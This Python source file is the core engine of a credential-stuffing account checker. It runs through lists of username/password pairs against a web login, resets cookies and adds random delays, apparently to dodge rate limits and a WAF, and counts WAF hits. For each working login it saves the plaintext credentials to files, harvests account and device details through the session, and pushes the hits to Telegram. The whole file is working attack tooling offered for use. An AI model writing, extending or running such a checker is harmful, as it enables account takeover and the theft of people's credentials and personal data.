"""Orchestrator with async emit for live web streaming."""
from __future__ import annotations
import asyncio
import json
import random
from pathlib import Path
from typing import Any, Awaitable, Callable, Optional

from . import info_extract
from .web_login import WebLogin

Emit = Callable[[dict[str, Any]], Awaitable[None]]


async def _noop_emit(_event: dict) -> None:
    return None


def _parse_result(raw: str) -> tuple[str, str]:
    status = "Unknown"
    try:
        j = json.loads(raw)
        if "message" in j:
            status = str(j["message"])
        if isinstance(j.get("data"), dict) and "name" in j["data"]:
            status = f"{status} | {j['data']['name']}"
    except Exception:
        status = "Parse Error"
    return ("VALID" if "Error_Success" in raw else "INVALID"), status


class Engine:
    def __init__(
        self,
        accounts: list[tuple[str, str]],
        out_dir: Path,
        emit: Optional[Emit] = None,
        telegram=None,
        devices_file: Optional[str] = None,
    ):
        self.accounts = accounts
        self.out_dir = out_dir
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.emit: Emit = emit or _noop_emit
        self.telegram = telegram
        self.devices_file = devices_file

        self.valid_count = 0
        self.invalid_count = 0
        self.error_count = 0
        self.waf_count = 0

        self._running = True

    def stop(self) -> None:
        self._running = False

    async def _log(self, text: str, kind: str = "info") -> None:
        print(text, flush=True)
        await self.emit({"type": "log", "kind": kind, "text": text})

    async def run(self) -> None:
        web = WebLogin()
        await web.start()

        total = len(self.accounts)
        await self.emit({"type": "start", "total": total})

        try:
            for i, (user, pw) in enumerate(self.accounts):
                if not self._running:
                    await self._log("[STOPPED]", "warn")
                    break

                await self.emit({
                    "type": "progress",
                    "index": i + 1,
                    "total": total,
                    "user": user,
                })
                await self._log(f"[{i + 1}/{total}] {user}")

                if i > 0 and i % 5 == 0:
                    try:
                        await web._ctx.clear_cookies()
                        await web._ensure_on_login()
                    except Exception:
                        pass

                raw: Optional[str]
                try:
                    raw = await web.try_login(user, pw)
                except Exception as e:
                    await self._log(f"[ERR] {e}", "error")
                    self.error_count += 1
                    await self.emit({"type": "error", "user": user, "msg": str(e)})
                    continue

                if not raw:
                    await self._log("[TIMEOUT] gave up", "error")
                    self.error_count += 1
                    await self.emit({"type": "error", "user": user, "msg": "timeout"})
                else:
                    label, status = _parse_result(raw)

                    if label == "VALID":
                        self.valid_count += 1
                        await self.emit({
                            "type": "result",
                            "user": user,
                            "pw": pw,
                            "label": "VALID",
                            "status": status,
                        })
                        self._save_valid(user, pw)

                        try:
                            j = json.loads(raw)
                            guid = j.get("guid") or (j.get("data") or {}).get("guid")
                            session = j.get("session") or (j.get("data") or {}).get("session")

                            if guid and session:
                                info = await asyncio.to_thread(
                                    info_extract.fetch,
                                    int(guid),
                                    session,
                                    self.devices_file,
                                )
                                if info:
                                    line = info_extract.format_pipe(info)
                                    await self.emit({
                                        "type": "valid",
                                        "user": user,
                                        "pw": pw,
                                        "pipe": line,
                                        "info": info,
                                    })
                                    self._save_valid_full(user, pw, info)
                                    if self.telegram:
                                        await asyncio.to_thread(
                                            self.telegram.push_valid,
                                            user,
                                            pw,
                                            line,
                                        )
                        except Exception as e:
                            await self._log(f"[INFO ERR] {e}", "error")
                            await self.emit({"type": "error", "user": user, "msg": f"info: {e}"})
                    else:
                        self.invalid_count += 1
                        await self.emit({
                            "type": "result",
                            "user": user,
                            "pw": pw,
                            "label": "INVALID",
                            "status": status,
                        })
                        await self._log(f"[INVALID] {user}  {status}", "dim")

                await asyncio.sleep(3.0 + random.random() * 8.0)
        finally:
            await web.stop()

        await self._log(
            f"=== DONE. Valid: {self.valid_count} | Invalid: {self.invalid_count} "
            f"| Error: {self.error_count} | WAF: {self.waf_count} ===",
            "done",
        )

    def _save_valid(self, user: str, pw: str) -> None:
        with open(self.out_dir / "valid.txt", "a", encoding="utf-8") as f:
            f.write(f"{user}:{pw}\n")

    def _save_valid_full(self, user: str, pw: str, info) -> None:
        with open(self.out_dir / "valid_full.txt", "a", encoding="utf-8") as f:
            f.write(f"{user}:{pw} | {info_extract.format_pipe(info)}\n")